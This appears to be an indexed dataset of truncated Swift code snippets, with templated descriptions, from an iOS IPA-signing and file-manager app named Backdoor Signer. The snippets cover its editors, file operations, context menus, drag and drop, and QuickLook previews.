2546,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Navigate back to the previous directory","@objc private func navigateBack() {
guard !directoryStack.isEmpty else { return }"
2547,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Reload the current directory contents","@objc private func reloadContents() {
guard let currentDir = currentDirectory else { return }"
2548,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Remove temporary directory when done","@objc private func cleanupTempDirectory() {
// Remove observer
NotificationCenter.default.removeObserver(self, name: UIApplication.willTerminateNotification, object: nil)

// Clean up temp directory
if let tempDir = tempDirectory, fileManager.fileExists(atPath: tempDir.path) {"
2549,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Show information about the IPA file","@objc private func showIPAInfo() {
activityIndicator.startAnimating()

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2550,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Find the Info.plist file in the IPA / - Returns: URL of the Info.plist if found, nil otherwise","private func findInfoPlist() -> URL? {
guard let tempDir = tempDirectory else { return nil }"
2551,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Display an alert with IPA information / - Parameters: /   - fileAttributes: File attributes of the IPA /   - appInfo: Contents of Info.plist if available","private func showIPAInfoAlert(fileAttributes: [FileAttributeKey: Any], appInfo: [String: Any]) {
var message = """"

// File info
if let fileSize = fileAttributes[.size] as? UInt64 {"
2552,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - Actions / Opens a file using appropriate editor based on file type / - Parameter fileURL: The URL of the file to open","private func openFile(_ fileURL: URL) {
let fileExtension = fileURL.pathExtension.lowercased()

switch fileExtension {"
2553,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Present an alert with a title and message / - Parameters: /   - title: Alert title /   - message: Alert message","private func presentAlert(title: String, message: String) {
let alert = UIAlertController(
title: title,
message: message,
preferredStyle: .alert
)

let okAction = UIAlertAction(title: ""OK"", style: .default)
alert.addAction(okAction)
"
2554,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - UITableViewDataSource","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return contents.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2555,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""Cell"", for: indexPath)
let fileURL = contents[indexPath.row]

// Configure cell
cell.textLabel?.text = fileURL.lastPathComponent

// Determine if it's a directory
var isDirectory: ObjCBool = false
if fileManager.fileExists(atPath: fileURL.path, isDirectory: &isDirectory) && isDirectory.boolValue {"
2556,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - UITableViewDelegate","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let selectedURL = contents[indexPath.row]

// Check if it's a directory
var isDirectory: ObjCBool = false
if fileManager.fileExists(atPath: selectedURL.path, isDirectory: &isDirectory) && isDirectory.boolValue {"
2557,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, accessoryButtonTappedForRowWith indexPath: IndexPath) {
let fileURL = contents[indexPath.row]

// Show file info
do {"
2558,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","/ Editor for property list (plist) files with syntax highlighting and validation","class PlistEditorViewController: BaseEditorViewController {
/// Flag to enable plist syntax validation
private var validateSyntax = true

override func viewDidLoad() {"
2559,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Set specific accessibility label for plist files
textView.accessibilityLabel = ""Plist Editor""

// Configure text view for plist editing
textView.autocorrectionType = .no
textView.autocapitalizationType = .none
textView.smartDashesType = .no"
2560,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","Function loadFileContent - implements loadfilecontent functionality","override func loadFileContent() {
// Use the base implementation but check file type first
if fileURL.pathExtension.lowercased() != ""plist"" {"
2561,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","Function saveChanges - implements savechanges functionality","override func saveChanges() {
// Optionally validate before saving
if validateSyntax {"
2562,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","MARK: - Plist-specific functionality / Validates that the content is a valid property list / - Returns: True if valid, false otherwise","private func validatePlistContent() -> Bool {
guard let text = textView.text else { return false }"
2563,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","/ Validates the plist content and shows result","@objc private func validatePlist() {
if validatePlistContent() {"
2564,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift","/ Toggle syntax validation on save","@objc private func toggleValidation() {
validateSyntax = !validateSyntax
presentAlert(
title: ""Validation "" + (validateSyntax ? ""Enabled"" : ""Disabled""),
message: validateSyntax ?
""Plist will be validated before saving."" :
""Plist will be saved without validation.""
)
}
}"
2565,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift","class TextEditorViewController - Controls user interface and application flow","class TextEditorViewController: BaseEditorViewController {
override func viewDidLoad() {"
2566,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Set specific accessibility label for text files
textView.accessibilityLabel = ""Text Editor""

// Customize for text editing
textView.autocorrectionType = .no
textView.autocapitalizationType = .none
textView.smartDashesType = .no"
2567,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift","MARK: - Additional Text Editor Features","@objc private func toggleLineNumbers() {
// This would implement line numbers in a production app
// For now, just show an alert that this feature is coming
presentAlert(
title: ""Line Numbers"",
message: ""Line numbers feature will be available in a future update.""
)

// Provide haptic feedback
HapticFeedbackGenerator.generateHapticFeedback(style: .medium)"
2568,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewControllerExtensions.swift","Extension to add protocol conformance to HomeViewController","extension HomeViewController {
// Note: All drag and drop methods have been moved to FileDragAndDrop.swift
// to avoid duplicate method declarations
}
"
2569,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift","Extension to add extra methods needed by the HomeViewController","extension HomeViewController {
// MARK: - File Creation Methods

/// Creates a new file in the specified directory
/// - Parameter directory: The directory to create the file in
func createNewFile(in directory: File) {"
2570,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift","MARK: - File Creation Methods / Creates a new file in the specified directory / - Parameter directory: The directory to create the file in","func createNewFile(in directory: File) {
guard directory.isDirectory else { return }"
2571,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift","/ Creates a new folder in the specified directory / - Parameter directory: The directory to create the folder in","func createNewFolder(in directory: File) {
guard directory.isDirectory else { return }"
2572,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","class FileContextMenu - implements functionality related to file context menu","class FileContextMenu: NSObject, UIContextMenuInteractionDelegate {
// MARK: - Properties

/// The view controller that owns this menu
private weak var viewController: UIViewController?

/// The file this menu is for
private var file: File

/// Callback for when a file action is performed"
2573,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","MARK: - UIContextMenuInteractionDelegate","func contextMenuInteraction(_: UIContextMenuInteraction,
configurationForMenuAtLocation _: CGPoint) -> UIContextMenuConfiguration?
{"
2574,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","MARK: - Menu Creation / Creates the context menu for the file / - Returns: A UIMenu with actions appropriate for the file","private func createContextMenu() -> UIMenu {
var actions: [UIAction] = []

// Open action - always available
actions.append(UIAction(
title: ""Open"",
image: UIImage(systemName: ""arrow.up.forward.app""),
handler: { [weak self] _ in"
2575,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","MARK: - Action Handlers / Share a file using the system share sheet / - Parameter viewController: The view controller to present from","private func shareFile(_ viewController: UIViewController) {
let activityViewController = UIActivityViewController(activityItems: [file.url], applicationActivities: nil)

// For iPad support
if let popoverController = activityViewController.popoverPresentationController {"
2576,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Rename a file / - Parameter viewController: The view controller to present from","private func renameFile(_: UIViewController) {
// Using HomeViewController's rename method directly as it's implemented there
}

/// Compress a file
/// - Parameter viewController: The view controller to present from
private func compressFile(_ viewController: UIViewController) {"
2577,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Compress a file / - Parameter viewController: The view controller to present from","private func compressFile(_ viewController: UIViewController) {
let zipURL = file.url.deletingPathExtension().appendingPathExtension(""zip"")

// Check if zip already exists
if FileManager.default.fileExists(atPath: zipURL.path) {"
2578,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Compress a directory / - Parameter viewController: The view controller to present from","private func compressDirectory(_ viewController: UIViewController) {
let zipURL = file.url.appendingPathExtension(""zip"")

// Check if zip already exists
if FileManager.default.fileExists(atPath: zipURL.path) {"
2579,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Perform the actual compression / - Parameters: /   - viewController: The view controller to present from /   - zipURL: The URL of the zip file to create","private func performCompression(_ viewController: UIViewController, zipURL: URL) {
// Show activity indicator
let activityIndicator = UIActivityIndicatorView(style: .large)
activityIndicator.center = viewController.view.center
activityIndicator.startAnimating()
viewController.view.addSubview(activityIndicator)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2580,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Edit a text file / - Parameter viewController: The view controller to present from","private func editFile(_ viewController: UIViewController) {
let fileExtension = file.url.pathExtension.lowercased()

if fileExtension == ""plist"" {"
2581,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Sign an IPA file / - Parameter viewController: The view controller to present from","private func signIPA(_ viewController: UIViewController) {
// Open the IPA editor
let editor = IPAEditorViewController(fileURL: file.url)
viewController.navigationController?.pushViewController(editor, animated: true)
}
}

/// Extension to add long press context menu to table view cells
extension UITableViewCell {"
2582,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Extension to add long press context menu to table view cells","extension UITableViewCell {
/// Add a context menu to this cell for a file
/// - Parameters:
///   - file: The file to create a menu for
///   - viewController: The view controller that owns this menu
///   - onActionPerformed: Callback for when a file action is performed
func addContextMenu(for file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {"
2583,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift","/ Add a context menu to this cell for a file / - Parameters: /   - file: The file to create a menu for /   - viewController: The view controller that owns this menu /   - onActionPerformed: Callback for when a file action is performed","func addContextMenu(for file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {
// Remove any existing interactions to avoid duplicates
for interaction in interactions {"
2584,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift","extension HomeViewController - Controls user interface and application flow","extension HomeViewController {
// MARK: - UITableViewDragDelegate

func tableView(_: UITableView, itemsForBeginning session: UIDragSession, at indexPath: IndexPath) -> [UIDragItem] {"
2585,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift","MARK: - UITableViewDragDelegate","func tableView(_: UITableView, itemsForBeginning session: UIDragSession, at indexPath: IndexPath) -> [UIDragItem] {
// Get the file at the index path
let file = searchController.isActive ? filteredFileList[indexPath.row] : fileList[indexPath.row]

// Check if file exists
guard FileManager.default.fileExists(atPath: file.url.path) else {"
2586,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift","MARK: - UITableViewDropDelegate","func tableView(_ tableView: UITableView, performDropWith coordinator: UITableViewDropCoordinator) {
// Handle internal reordering
if coordinator.session.hasItemsConforming(toTypeIdentifiers: [UTType.url.identifier]) {"
2587,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift","Function handleExternalDrop - implements handleexternaldrop functionality","func handleExternalDrop(_ dropItem: UITableViewDropItem, coordinator _: UITableViewDropCoordinator) {
// Check for URLs
if dropItem.dragItem.itemProvider.hasItemConformingToTypeIdentifier(UTType.url.identifier) {"
2588,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, dropSessionDidUpdate session: UIDropSession,
withDestinationIndexPath _: IndexPath?) -> UITableViewDropProposal
{"
2589,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","enum FileOperationError - implements functionality related to file operation error","enum FileOperationError: Error {
case fileNotFound(String)
case invalidDestination(String)
case unknownError(String)
case permissionDenied(String)
}

class FileOperations {"
2590,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","class FileOperations - implements functionality related to file operations","class FileOperations {
static let fileManager = FileManager.default

static func copyFile(at sourceURL: URL, to destinationURL: URL) throws {"
2591,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function copyFile - implements copyfile functionality","static func copyFile(at sourceURL: URL, to destinationURL: URL) throws {
guard fileManager.fileExists(atPath: sourceURL.path) else {"
2592,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function moveFile - implements movefile functionality","static func moveFile(at sourceURL: URL, to destinationURL: URL) throws {
guard fileManager.fileExists(atPath: sourceURL.path) else {"
2593,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function deleteFile - deletes file","static func deleteFile(at fileURL: URL) throws {
guard fileManager.fileExists(atPath: fileURL.path) else {"
2594,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function renameFile - implements renamefile functionality","static func renameFile(at sourceURL: URL, to destinationURL: URL) throws {
guard fileManager.fileExists(atPath: sourceURL.path) else {"
2595,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function createDirectory - creates directory","static func createDirectory(at directoryURL: URL) throws {
do {"
2596,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function fileExists - implements fileexists functionality","static func fileExists(at path: String) -> Bool {
return fileManager.fileExists(atPath: path)
}

static func fileSize(at fileURL: URL) -> UInt64? {"
2597,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function fileSize - implements filesize functionality","static func fileSize(at fileURL: URL) -> UInt64? {
do {"
2598,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function creationDate - implements creationdate functionality","static func creationDate(at fileURL: URL) -> Date? {
do {"
2599,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function unzipFile - implements unzipfile functionality","static func unzipFile(at sourceURL: URL, to destinationURL: URL) throws {
guard fileManager.fileExists(atPath: sourceURL.path) else {"
2600,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function hexEditFile - implements hexeditfile functionality","static func hexEditFile(at fileURL: URL, in viewController: UIViewController) {
guard fileManager.fileExists(atPath: fileURL.path) else {"
2601,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift","Function openIPA - implements openipa functionality","static func openIPA(at fileURL: URL, in viewController: UIViewController) {
guard fileManager.fileExists(atPath: fileURL.path) else {"
2602,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","protocol FileHandlingDelegate - implements functionality related to file handling delegate","protocol FileHandlingDelegate: AnyObject {
var documentsDirectory: URL { get }"
2603,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function loadFiles - implements loadfiles functionality","func loadFiles()
func present(_ viewControllerToPresent: UIViewController, animated flag: Bool, completion: (() -> Void)?)
}

class HomeViewFileHandlers {"
2604,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function present - implements present functionality","func present(_ viewControllerToPresent: UIViewController, animated flag: Bool, completion: (() -> Void)?)
}

class HomeViewFileHandlers {"
2605,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","class HomeViewFileHandlers - implements functionality related to home view file handlers","class HomeViewFileHandlers {
private let fileManager = FileManager.default
private let utilities = HomeViewUtilities()
private let logger = Logger(subsystem: ""com.example.FileNexus"", category: ""FileHandlers"")

func uploadFile(viewController: FileHandlingDelegate) {"
2606,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function uploadFile - implements uploadfile functionality","func uploadFile(viewController: FileHandlingDelegate) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: [.data, .archive, .text])
documentPicker.delegate = viewController as? UIDocumentPickerDelegate
documentPicker.modalPresentationStyle = .formSheet
viewController.present(documentPicker, animated: true, completion: nil)
}

func importFile(viewController: FileHandlingDelegate) {"
2607,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function importFile - implements importfile functionality","func importFile(viewController: FileHandlingDelegate) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: [.data, .archive, .text])
documentPicker.delegate = viewController as? UIDocumentPickerDelegate
documentPicker.modalPresentationStyle = .formSheet
viewController.present(documentPicker, animated: true, completion: nil)
}

func createNewFolder(
viewController: FileHandlingDelegate,
folderName: String,"
2608,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function createNewFolder - creates newfolder","func createNewFolder(
viewController: FileHandlingDelegate,
folderName: String,
completion: @escaping (Result<URL, Error>) -> Void
) {"
2609,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function createNewFile - creates newfile","func createNewFile(
viewController: FileHandlingDelegate,
fileName: String,
completion: @escaping (Result<URL, Error>) -> Void
) {"
2610,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function unzipFile - implements unzipfile functionality","func unzipFile(
viewController: FileHandlingDelegate,
fileURL: URL,
destinationName: String,
progressHandler: ((Double) -> Void)? = nil,
completion: @escaping (Result<URL, Error>) -> Void
) {"
2611,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift","Function shareFile - implements sharefile functionality","func shareFile(viewController: UIViewController, fileURL: URL) {
let activityController = UIActivityViewController(activityItems: [fileURL], applicationActivities: nil)

// For iPad support
if let popoverController = activityController.popoverPresentationController {"
2612,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift","class HomeViewTableHandlers - implements functionality related to home view table handlers","class HomeViewTableHandlers {
private let utilities: HomeViewUtilities

init(utilities: HomeViewUtilities) {"
2613,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView,
performDropWith coordinator: UITableViewDropCoordinator,
fileList: inout [File],
documentsDirectory _: URL,
loadFiles: @escaping () -> Void)
{"
2614,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift","Function performFileReorder - implements performfilereorder functionality","private func performFileReorder(tableView: UITableView,
sourceIndex: Int,
destinationIndexPath: IndexPath,
fileList: inout [File],
completion: @escaping () -> Void)
{"
2615,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","class FileTableViewCell - implements functionality related to file table view cell","class FileTableViewCell: UITableViewCell {
let fileIconImageView = UIImageView()
let fileNameLabel = UILabel()
let fileSizeLabel = UILabel()
let fileDateLabel = UILabel()

override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {"
2616,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","Function setupUI - sets upui","private func setupUI() {
contentView.addSubview(fileIconImageView)
contentView.addSubview(fileNameLabel)
contentView.addSubview(fileSizeLabel)
contentView.addSubview(fileDateLabel)

fileIconImageView.translatesAutoresizingMaskIntoConstraints = false
fileNameLabel.translatesAutoresizingMaskIntoConstraints = false
fileSizeLabel.translatesAutoresizingMaskIntoConstraints = false
fileDateLabel.translatesAutoresizingMaskIntoConstraints = false"
2617,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","Function configure - implements configure functionality","func configure(with file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {
fileNameLabel.text = file.name
fileSizeLabel.text = ByteCountFormatter.string(fromByteCount: Int64(file.size), countStyle: .file)
let dateFormatter = DateFormatter()
dateFormatter.dateStyle = .medium
dateFormatter.timeStyle = .short
fileDateLabel.text = dateFormatter.string(from: file.date)
fileIconImageView.image = UIImage(named: file.iconName) ?? UIImage(systemName: file.iconName)
accessibilityElements = [fileIconImageView, fileNameLabel, fileSizeLabel, fileDateLabel]
"
2618,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","Function handleLongPress - implements handlelongpress functionality","@objc private func handleLongPress(_ gesture: UILongPressGestureRecognizer) {
if gesture.state == .began {"
2619,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","/ Represents a file in the file system with cached attributes for performance","class File: Equatable {
/// URL of the file
let url: URL

/// File name (cached)
let name: String

/// File size in bytes (cached)
let size: UInt64
"
2620,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","/ Format the file size for display / - Returns: Human-readable file size string","func formattedSize() -> String {
return ByteCountFormatter.string(fromByteCount: Int64(size), countStyle: .file)
}

/// Format the date for display
/// - Returns: Formatted date string
func formattedDate() -> String {"
2621,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift","/ Format the date for display / - Returns: Formatted date string","func formattedDate() -> String {
let formatter = DateFormatter()
formatter.dateStyle = .medium
formatter.timeStyle = .short
return formatter.string(from: date)
}

/// Equatable implementation
static func == (lhs: File, rhs: File) -> Bool {"
2622,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift","class HomeViewUI - implements functionality related to home view u i","class HomeViewUI {
static let navigationBar: UINavigationBar = {"
2623,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift","extension UIButton - implements functionality related to u i button","extension UIButton {
func addGradientBackground() {"
2624,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift","Function addGradientBackground - implements addgradientbackground functionality","func addGradientBackground() {
let gradient = CAGradientLayer()
gradient.frame = bounds
gradient.colors = [UIColor.systemBlue.cgColor, UIColor.systemCyan.cgColor]
gradient.startPoint = CGPoint.zero
gradient.endPoint = CGPoint(x: 1, y: 1)
gradient.cornerRadius = 10
layer.insertSublayer(gradient, at: 0)
}
}"
2625,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift","class IconManager - Manages system resources and operations","class IconManager {
static let shared = IconManager()
private let fileManager = FileManager.default
private let iconBundleURL = Bundle.main.url(forResource: ""Icons"", withExtension: ""bundle"")!

func loadIcon(for name: String) -> UIImage? {"
2626,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift","Function loadIcon - implements loadicon functionality","func loadIcon(for name: String) -> UIImage? {
let iconPath = iconBundleURL.appendingPathComponent(""\(name).png"")
return UIImage(contentsOfFile: iconPath.path)
}

func registerCustomIcons() {"
2627,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift","Function registerCustomIcons - implements registercustomicons functionality","func registerCustomIcons() {
// Ensure icons are bundled; these can be generated via image generation tool
let iconNames = [""iconText"", ""iconPlist"", ""iconIPA"", ""iconZip"", ""iconPDF"", ""iconGeneric""]
for name in iconNames {"
2628,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","class FilePreviewController - Controls user interface and application flow","class FilePreviewController: UIViewController, QLPreviewControllerDataSource, QLPreviewControllerDelegate {
// MARK: - Properties

/// The file URL to preview
private let fileURL: URL

/// The preview controller
private let previewController = QLPreviewController()

// MARK: - Initialization"
2629,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupPreviewController()
}

// MARK: - Setup

/// Sets up the preview controller
private func setupPreviewController() {"
2630,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","MARK: - Setup / Sets up the preview controller","private func setupPreviewController() {
previewController.dataSource = self
previewController.delegate = self
addChild(previewController)
view.addSubview(previewController.view)
previewController.view.frame = view.bounds
previewController.view.autoresizingMask = [.flexibleWidth, .flexibleHeight]
previewController.didMove(toParent: self)
}
"
2631,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","MARK: - QLPreviewControllerDataSource","func numberOfPreviewItems(in _: QLPreviewController) -> Int {
return 1
}

func previewController(_: QLPreviewController, previewItemAt _: Int) -> QLPreviewItem {"
2632,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","Function previewController - implements previewcontroller functionality","func previewController(_: QLPreviewController, previewItemAt _: Int) -> QLPreviewItem {
return fileURL as QLPreviewItem
}

// MARK: - QLPreviewControllerDelegate

func previewController(_: QLPreviewController, didUpdateContentsOf _: QLPreviewItem) {"
2633,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift","MARK: - QLPreviewControllerDelegate","func previewController(_: QLPreviewController, didUpdateContentsOf _: QLPreviewItem) {
// Handle any updates if needed
}
}

// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted"
2634,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift","class FilePreviewManager - Manages system resources and operations","class FilePreviewManager {
/// Present a preview for a file using QuickLook
/// - Parameters:
///   - file: The file to preview
///   - viewController: The view controller to present from
static func presentPreview(for file: File, from viewController: UIViewController) {"
